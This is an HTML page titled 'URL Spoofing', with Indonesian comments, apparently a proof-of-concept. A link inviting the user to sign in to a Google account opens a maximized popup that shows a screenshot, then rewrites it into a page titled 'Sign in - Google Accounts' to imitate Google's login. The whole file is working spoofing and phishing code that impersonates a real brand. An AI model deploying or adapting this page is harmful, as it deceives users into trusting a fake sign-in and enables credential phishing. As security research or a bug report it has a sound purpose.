<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <title>URL Spoofing</title>

    <script>
        function openWin() {
            // Hitung ukuran maximized (availWidth/availHeight abaikan taskbar)
            var width = screen.availWidth;
            var height = screen.availHeight;
            var left = screen.availLeft || 0;
            var top = screen.availTop || 0;

            var params = `width=${width},height=${height},left=${left},top=${top},`
                       + `toolbar=yes,location=yes,menubar=yes,status=yes,scrollbars=no,resizable=yes`;

            var spoofWin = window.open("", "_blank", params);

            // Write HTML dengan spoof.png dulu (main content)
            var spoofHTML = `
                <!DOCTYPE html>
                <html>
                <head>
                    <style>
                        body { margin:0; padding:0; background:black; }
                        img { width:100%; height:100%; object-fit:cover; }
                    </style>
                </head>
                <body>
                    <img src="spoof.png">
                </body>
                </html>
            `;

            spoofWin.document.open();
            spoofWin.document.write(spoofHTML);
            spoofWin.document.close();

            // Optional: ganti jadi sign.png setelah delay (simulasi login)
            setTimeout(() => {
                var signHTML = `
                    <!DOCTYPE html>
                    <html>
                    <head><title>Sign in - Google Accounts</title></head>
                    <body>
                        <img src="sign.png" style="width:100%; height:100%; object-fit:cover;">
                    </body>
                    </html>
                `;
                spoofWin.document.open();
                spoofWin.document.write(signHTML);
                spoofWin.document.close();
            }, 2000); // delay 2 detik, atau trigger dari action lain kalau perlu
        }
    </script>
</head>
<body>
    <center>
        <br>
        <h1>
            <a href="#" onclick="openWin(); return false;">
                Click here to sign in into your Google Account V3
            </a>
        </h1>
    </center>
</body>
</html>
